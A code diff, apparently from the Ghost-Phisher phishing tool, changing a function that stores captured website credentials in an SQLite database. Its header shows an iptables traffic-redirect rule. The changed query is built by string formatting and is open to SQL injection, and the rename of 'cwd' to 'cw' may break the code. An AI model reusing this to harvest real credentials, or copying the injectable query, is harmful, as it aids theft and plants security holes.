@@ -2443,10 +2443,13 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
 
     def database_commit(self,website,username,password):
-        database = sqlite3.connect(cwd + '/Ghost-Phisher-Database/' + 'database.db')
+        ''' Commits captured credential to database'''
+        space = ' ' * 5         #Adding some white spaces
+        database = sqlite3.connect(cw + '/Ghost-Phisher-Database/' + 'database.db')
         database_query = database.cursor()
         database_query.execute('create table if not exists credentials (website text, username text, password text)')
-        database_query.execute("insert into credentials values ('%s','%s','%s')"%(website,username,password))
+        database_query.execute("insert into credentials values ('%s','%s','%s')"% \
+                                        (website + space,username + space,password + space))
         database.commit()
         database.close()
 
